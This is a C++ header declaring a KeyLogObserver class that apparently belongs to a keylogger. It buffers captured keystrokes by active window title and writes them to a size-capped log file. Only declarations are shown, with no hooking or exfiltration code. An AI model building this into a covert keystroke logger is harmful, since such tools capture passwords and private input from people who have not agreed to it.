#pragma once

#include "KeyObserver.hpp"

namespace Keyboard
{
	class KeyLogObserver : public KeyObserver
	{
		enum {MAX_TITLE_SIZE = 255, MAX_BUFFERED = 2048, LOGFILE_MAX_SIZE = 5000000};

		public:
			KeyLogObserver(const std::string& file);
			virtual ~KeyLogObserver();
			virtual void update(const KeyInformation& ki);
			void flush();
			void clearLogFile();
			void addKey(PWCHAR key);
			const std::string& getLogFilePath();
            void setKeylog(const std::string& file);

		private:
			std::string logFilePath;
            std::wfstream logFile;
			unsigned int bufferedChar;
			std::wstring currentWindow;
			std::wstring currentWindowIndex;
            std::map<std::wstring, std::wstring> logBuffer;

			HINSTANCE kbdLibrary;
			int nChar;
			WCHAR outputChar;
			WCHAR deadChar;
	};
} // Keyboard
